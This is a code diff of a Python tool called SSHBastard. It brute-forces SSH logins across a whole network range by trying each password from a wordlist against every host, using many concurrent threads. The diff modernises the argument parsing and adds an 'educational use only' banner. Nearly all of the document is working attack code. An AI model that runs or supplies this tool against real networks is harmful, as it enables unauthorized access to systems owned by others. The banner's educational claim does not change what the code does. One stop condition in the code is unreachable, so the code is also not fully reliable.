@@ -1,46 +1,39 @@
-# This tool scan a choosen network to search ssh servers on port 22
-# and port 2222 (a classic). Then will try to brute them.
-# It's a tool that i made for learning python purpose only.
-# Nowadays bruteforcing SSH is does not make sense at all to me.
-# We're not in '98 and password are not 'password' or '12345' but more complex.
-# Also if you think that on entire internet will be a couple of misconfigured
-# ssh server don't loose your time. Keep studying and coding.
+# -*- coding: utf-8 -*-
+# Author: calfcrusher@inventati.org
 
-import optparse
-import time
+import argparse
 import os
+import time
 import threading
 import ipaddress
+import sys
 
 from pexpect import pxssh
 from termcolor import colored
 
+maxConnections = 150
+connection_lock = threading.BoundedSemaphore(value=maxConnections)
 
-maxConnections = 50000
-connection_lock = threading.Semaphore
-FOUND = False
-FAILS = 0
+Found = False
+Fails = 0
 
 
-def connect(host, user, password, release):
-    """Function to connect to ssh server"""
+def connect(host, user, password, release=True):
+    """Connect to ssh function"""
 
-    global FOUND
-    global FAILS
+    global Found
+    global Fails
 
     try:
         s = pxssh.pxssh()
         s.login(host, user, password)
-        print(colored('[+] Password FOUND: ' + password + " for user " + user + " on " + host), 'red')
-        FOUND = True
+        print(colored('[+] Password FOUND: ' + password + " for user " + user + " on " + host, 'red'))
+        Found = True
     except Exception as e:
-        # if socket is 'read_non- blocking' we assume that SSH server is maxed out at number of connections
         if 'read_nonblocking' in str(e):
-            FAILS += 1
-            # Sleep a little before trying again the same password
+            Fails += 1
             time.sleep(5)
             connect(host, user, password, False)
-        # if pxssh is having difficult obtaining command prompt, just sleep
         elif 'synchronize with original prompt' in str(e):
             time.sleep(1)
             connect(host, user, password, False)
@@ -52,41 +45,52 @@ def connect(host, user, password, release):
 def main():
     """Main function of tool"""
 
-    parser = optparse.OptionParser('./ssh-bastard.py -H <CIDR> -u <user> -F <passwordfile>')
-    parser.add_option('-H', dest='cidr', type='string', help='specify a CIDR')
-    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
-    parser.add_option('-u', dest='user', type='string', help='specify the user')
-    (options, args) = parser.parse_args()
-    cidr = options.cidr
-    passwdFile = options.passwdFile
-    user = options.user
+    parser = argparse.ArgumentParser(usage='python3 SSHBastard.py CIDR -u USER -f PASSFILE')
+    parser.add_argument('cidr', type=str, metavar='CIDR', help="set target CIDR")
+    parser.add_argument('-u', type=str, metavar='USERNAME', required=True, help='set user name')
+    parser.add_argument('-f', type=str, metavar='PASSWD_FILE', required=True, help='set passwords file')
 
-    if cidr is None or passwdFile is None or user is None:
-        print(parser.usage)
-        exit(0)
+    args = parser.parse_args()
+    target_cidr = args.cidr
+    passwd_file = args.f
+    user = args.u
 
-    with open(passwdFile) as f:
-        for line in f.readlines():
-            if FOUND:
-                # Exit from cycle if password is found
-                print("[*] ONE PASSWORD FOUND! Exiting..")
-                exit(0)
-            if FAILS > 5:
-                # Also exit from cycle if we have too many sockets timeouts
-                print("[!] Exiting: Too Many Socket Timeouts")
-                exit(0)
+    print("""\033[91m
 
-            connection_lock.acquire(self=)
-            password = line.strip('\r').strip('\n')
+             █▀ █▀ █░█ █▄▄ ▄▀█ █▀ ▀█▀ ▄▀█ █▀█ █▀▄
+             ▄█ ▄█ █▀█ █▄█ █▀█ ▄█ ░█░ █▀█ █▀▄ █▄▀     
 
-            # Reading CIDR
-            for ip in ipaddress.IPv4Network(cidr):
+       calfcrusher@inventati.org | For educational use only
+    \x1b[0m""")
+
+    # animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
+    animation = ["\t\t\t[■□□□□□□□□□]", "\t\t\t[■■□□□□□□□□]", "\t\t\t[■■■□□□□□□□]", "\t\t\t[■■■■□□□□□□]", "\t\t\t["
+                                                                                                         "■■■■■□□□□□]",
+                 "\t\t\t[■■■■■■□□□□]", "\t\t\t[■■■■■■■□□□]", "\t\t\t[■■■■■■■■□□]", "\t\t\t[■■■■■■■■■□]",
+                 "\t\t\t[■■■■■■■■■■]"]
+
+    for i in range(len(animation)):
+        time.sleep(0.3)
+        sys.stdout.write("\r" + animation[i % len(animation)])
+        sys.stdout.flush()
+
+    print("\n")
+
+    with open(passwd_file) as file:
+        for line in file.readlines():
+            for ip in ipaddress.IPv4Network(target_cidr):
+                if Found:
+                    exit(0)
+                    if Fails > 5:
+                        print("[!] Exiting: Too Many Socket Timeouts")
+                        exit(0)
+                connection_lock.acquire()
+                password = line.strip('\r').strip('\n')
                 print("[-] Testing: " + str(password) + " for user " + user + " on host " + str(ip))
-                t = threading.Thread(target=connect, args=(ip, user, password, True))
+                t = threading.Thread(target=connect, args=(str(ip), user, password))
                 t.start()
 
 
 if __name__ == '__main__':
     os.system("clear")
     main()
-
